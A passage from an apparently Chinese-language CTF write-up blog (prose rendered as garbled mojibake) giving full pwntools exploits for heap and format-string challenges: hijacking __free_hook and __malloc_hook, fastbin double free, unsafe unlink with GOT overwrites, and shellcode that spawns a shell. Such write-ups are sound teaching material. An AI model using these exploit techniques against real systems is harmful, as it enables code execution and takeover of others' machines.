mbruteforce(<span class="keyword">lambda</span> x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, <span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;????&gt; &#x27;</span>, proof)</span><br><span class="line">brute()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;: 0x&#x27;</span>)</span><br><span class="line">write=<span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write)</span><br><span class="line">libc_base=write-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&#x27;libc_base===&gt;&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">__libc_start_main=libc_base+libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;/proc/self/mem\x00&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(__libc_start_main))</span><br><span class="line"></span><br><span class="line">payload=asm(shellcraft.sh()).rjust(<span class="number">0x300</span>,asm(<span class="string">&#x27;nop&#x27;</span>))</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="echo-server"><a href="#echo-server" class="headerlink" title="echo_server"></a>echo_server</h3><p>åœ¨å †ä¸Šæ„é€ æ ˆçš„ fmt é“¾å­çš„é¢˜ç›®ï¼Œæ€»ç®—æœ‰æœºä¼šå¤ç›˜ä¸€éäº†ï¼Œç¡®å®éº»çƒ¦ã€‚</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/38973/13/22033/28494/63c7aeacFa044f73d/7945680aac3fdbbe.png" style="zoom:80%;" /><p>ç¨‹åºé€»è¾‘å¾ˆç®€å•ï¼Œå°±æ˜¯ä¸€ä¸ªä¸æ–­å¾ªç¯çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬åŠ¨è°ƒçœ‹ä¸€ä¸‹æ ˆçš„ç»“æ„ï¼š</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/184800/16/30987/103139/63c7aeacF807096d0/dac72b77454e61c7.png" style="zoom:80%;" /><p>é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æˆ‘ä»¬å¯ä»¥æ³„éœ²å‡º<code>rbp</code>å’Œ<code>libc</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">input</span>(<span class="params">content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    io.send(content)</span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;%6$p-%13$p&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">rbp=<span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;rbp=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(rbp)))</span><br><span class="line">io.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)-libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]-<span class="number">243</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">__free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br></pre></td></tr></table></figure><p>å› ä¸º realloc çš„<code>size</code>ä½ä¸º 0 æ—¶ç­‰åŒäº freeï¼Œå› æ­¤æ¥ä¸‹æ¥æˆ‘ä»¬é€‰æ‹©åœ¨æ ˆä¸Šæ„é€  __free_hookã€‚</p><p>å¦‚ä½•æ„é€ å°±éœ€è¦ç”¨åˆ° rbp é“¾äº†ï¼š</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/8746/26/21445/113047/63c7aeadF796627ad/e564dde984db2034.png" style="zoom:80%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__libc_start_main_in_stack=(rbp &amp; <span class="number">0xFF</span>)+<span class="number">0x18</span></span><br><span class="line">log.success(<span class="string">&quot;__libc_start_main_in_stack:&quot;</span>+<span class="built_in">hex</span>(__libc_start_main_in_stack))</span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%6$hhn\n&quot;</span>.<span class="built_in">format</span>(__libc_start_main_in_stack+<span class="number">2</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶æˆ‘ä»¬é€‰æ‹©å…ˆæ„é€ ä¸­é—´ä¿©å­—èŠ‚ï¼Œæ‰€ä»¥å°† rbp ä¿®æ”¹ä¸º<code>ç›®æ ‡åœ°å€+2</code>å¤„</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/32370/12/20382/52439/63c7aeafF1f410f93/36d22f9cd324267d.png" style="zoom:80%;" /><p>ç„¶åæˆ‘ä»¬åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå°† rbp æŒ‡å‘å¤„å†™å…¥ __free_hook å¯¹åº”çš„ 2 ä¸ªå­—èŠ‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>((__free_hook &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br></pre></td></tr></table></figure><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/181181/27/31734/49453/63c7aeaeF8db3bcc9/9774a07007e1c680.png" style="zoom:80%;" /><p>é‡å¤ä¸Šè¿°æ­¥éª¤æˆ‘ä»¬åŒç†å¯ä»¥ä¿®æ”¹æœ€åä¸¤ä¸ªå­—èŠ‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%6$hhn\n&quot;</span>.<span class="built_in">format</span>(__libc_start_main_in_stack)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>(__free_hook &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br></pre></td></tr></table></figure><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/63189/30/23701/56144/63c7af8cFe4ad12d6/d1e9b4b51c1f0698.png" style="zoom:80%;" /><p>è¿™æ ·æˆ‘ä»¬åœ¨æ ˆä¸Šå°±æœ‰äº†<code>__free_hook</code>ï¼Œé‡å¤ä¸Šè¿°æ­¥éª¤ï¼Œé€šè¿‡åˆ©ç”¨å½“å‰ rbp ä¿®æ”¹å†™å…¥ä½ç½®ï¼Œæˆ‘ä»¬ä¾¿èƒ½å°†<code>__free_hook</code>åŠ«æŒä¸º<code>system</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%13$hn\n&quot;</span>.<span class="built_in">format</span>((system) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>(__free_hook + <span class="number">2</span> &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%13$hn\n&quot;</span>.<span class="built_in">format</span>((system &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>(__free_hook + <span class="number">4</span> &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#free_hook+4=&gt;(system &gt;&gt; 32) &amp; 0xFFFF</span></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%13$hn\n&quot;</span>.<span class="built_in">format</span>((system &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br></pre></td></tr></table></figure><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/63189/30/23701/56144/63c7af8cFe4ad12d6/d1e9b4b51c1f0698.png" style="zoom:80%;" /><p>å®Œæ•´ expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&quot;./echo&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">input</span>(<span class="params">content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line"><span class="comment">#get libc &amp; rbp</span></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;%6$p-%13$p&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">rbp=<span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;rbp=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(rbp)))</span><br><span class="line">io.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)-libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]-<span class="number">243</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">__free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">__libc_start_main_in_stack=(rbp &amp; <span class="number">0xFF</span>)+<span class="number">0x18</span></span><br><span class="line">log.success(<span class="string">&quot;__libc_start_main_in_stack:&quot;</span>+<span class="built_in">hex</span>(__libc_start_main_in_stack))</span><br><span class="line"></span><br><span class="line"><span class="comment">#rbp1=&gt;rbp2</span></span><br><span class="line"><span class="comment">#rbp2=&gt;__libc_start_main+2</span></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%6$hhn\n&quot;</span>.<span class="built_in">format</span>(__libc_start_main_in_stack+<span class="number">2</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#rbp2=&gt;__libc_start_main+2</span></span><br><span class="line"><span class="comment">#__libc_start_main+2=(__free_hook &gt;&gt; 16) &amp; 0xFFFF</span></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>((__free_hook &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#rbp1=&gt;rbp2</span></span><br><span class="line"><span class="comment">#rbp2=&gt;__libc_start_main</span></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%6$hhn\n&quot;</span>.<span class="built_in">format</span>(__libc_start_main_in_stack)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#rbp2=&gt;__libc_start_main</span></span><br><span class="line"><span class="comment">#__libc_start_main+0=__free_hook &amp; 0xFFFF</span></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>(__free_hook &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"><span class="comment">#now original __libc_start_main_in_stack = __free_hook</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#__free_hook+0=&gt;(system) &amp; 0xFFFF</span></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%13$hn\n&quot;</span>.<span class="built_in">format</span>((system) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#rbp2=&gt;__free_hook</span></span><br><span class="line"><span class="comment">#__free_hook=__free_hook+2</span></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>(__free_hook + <span class="number">2</span> &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#free_hook+2=&gt;(system &gt;&gt; 16) &amp; 0xFFFF</span></span><br><span class="line">payload = <span class="string">&quot;%&#123;&#125;c%13$hn\n&quot;</span>.<span class="built_in">format</span>((system &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#rbp2=&gt;__free_hook+2</span></span><br><span class="line"><span class="comment">#__free_hook+2=__free_hook+4</span></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>(__free_hook + <span class="number">4</span> &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#free_hook+4=&gt;(system &gt;&gt; 32) &amp; 0xFFFF</span></span><br><span class="line">payload=<span class="string">&quot;%&#123;&#125;c%13$hn\n&quot;</span>.<span class="built_in">format</span>((system &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xFFFF</span>)</span><br><span class="line"><span class="built_in">input</span>(payload)</span><br><span class="line"><span class="comment">#now free_hook =&gt; system</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="WEEK3"><a href="#WEEK3" class="headerlink" title="WEEK3"></a>WEEK3</h2><h3 id="elder-note"><a href="#elder-note" class="headerlink" title="elder_note"></a>elder_note</h3><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/129636/40/34283/6010/63c7b2c5F9c8406a8/c2b2fed3e7319002.png" style="zoom:80%;" /><p>libc2.23 ä¸‹çš„ <strong>UAF</strong>ï¼Œæœ€å¤§å¯ç”³è¯· 0x100 å¤§å°çš„ chunkï¼Œæ‰€ä»¥é€šè¿‡ unsorted bin leak ä¾¿èƒ½æ³„éœ²å‡º libcã€‚é€šè¿‡ double free å°† chunk åˆ†é…åˆ°<code>&amp;_malloc_hook-0x23</code>å¤„ã€‚ä½†å› ä¸ºæ— æ³•æ»¡è¶³ one_gadget çš„æ¡ä»¶ï¼Œæ‰€ä»¥é…åˆ<code>&amp;_realloc_hook</code> è°ƒæ•´æ ˆå¸§ï¼Œå³å°†<code>&amp;_malloc_hook</code>åŠ«æŒä¸º<code>&amp;realloc+?</code>ï¼Œå†å°†<code>&amp;_realloc_hook</code>åŠ«æŒä¸º one_gadgetã€‚</p><p>exp å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&quot;./note&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sh.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x0</span>, <span class="number">0x100</span>, <span class="string">&quot;A&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x1</span>, <span class="number">0x68</span>, <span class="string">&quot;B&quot;</span>*<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x2</span>, <span class="number">0x68</span>, <span class="string">&quot;B&quot;</span>*<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>] - <span class="number">0x68</span> </span><br><span class="line">__malloc_hook = libc_base + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">__realloc_hook = libc_base + libc.sym[<span class="string">&quot;__realloc_hook&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4527a</span></span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&quot;__libc_realloc&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x68</span>, p64(__malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x68</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x68</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x68</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0xb</span> + p64(one_gadget) + p64(realloc + <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="changeable-note"><a href="#changeable-note" class="headerlink" title="changeable_note"></a>changeable_note</h3><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/103097/3/27197/21707/63c7b2c8Ff5b87dbc/81e0c45a66912503.png" style="zoom:80%;" /><p>edit é‡Œæœ‰ä¸ªæº¢å‡ºå‡½æ•°<code>gets</code>ï¼Œå› æ­¤å¯ä»¥æ„é€  unlink æ”¹å†™ notes æ•°ç»„çš„å†…å®¹ä¸ºæƒ³è¦çš„åœ°å€<code>&amp;_free_hook</code>ï¼Œç„¶åå†å°†ç›®æ ‡å‡½æ•°ç¯¡æ”¹ä¸º<code>system</code>ã€‚</p><p>exp å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&quot;./note&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./note&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sh.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>, content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, payload</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sh.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">note_addr = <span class="number">0x4040C0</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x20</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x20</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x100</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x20</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(note_addr + <span class="number">8</span> - <span class="number">0x18</span>) + p64(note_addr + <span class="number">8</span> - <span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0x20</span>) + p64(<span class="number">0x110</span>)</span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">2</span> + p64(elf.got[<span class="string">&#x27;free&#x27;</span>]) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]) + p64(note_addr) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, p64(elf.sym[<span class="string">&#x27;puts&#x27;</span>])[:-<span class="number">1</span>] + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base: &quot;</span> + <span 